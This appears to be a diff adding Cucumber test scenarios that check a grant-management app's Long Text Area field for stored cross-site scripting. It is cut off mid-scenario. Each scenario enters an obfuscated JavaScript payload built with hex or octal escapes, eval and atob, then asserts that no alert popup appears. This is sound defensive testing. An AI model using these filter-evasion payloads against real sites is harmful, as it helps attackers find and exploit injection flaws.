+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                   | Field                          |
+      | ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307284 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                   | Field                          |
+      | ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307287 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                 | Field                          |
+      | ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307291 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                       | Field                          |
+      | ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307301 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                       | Field                          |
+      | ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307303 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                               | Field                          |
+      | ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307304 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                 | Field                          |
+      | ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307306 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                           | Field                          |
+      | ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307307 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                           | Field                          |
+      | ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307320 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                        | Field                          |
+      | ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307321 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                 | Field                          |
+      | ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307322 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                 | Field                          |
+      | ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307328 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                             | Field                          |
+      | ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307332 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';window['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307333 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                             | Field                          |
+      | ';self['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307334 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                             | Field                          |
+      | ';this['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307335 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
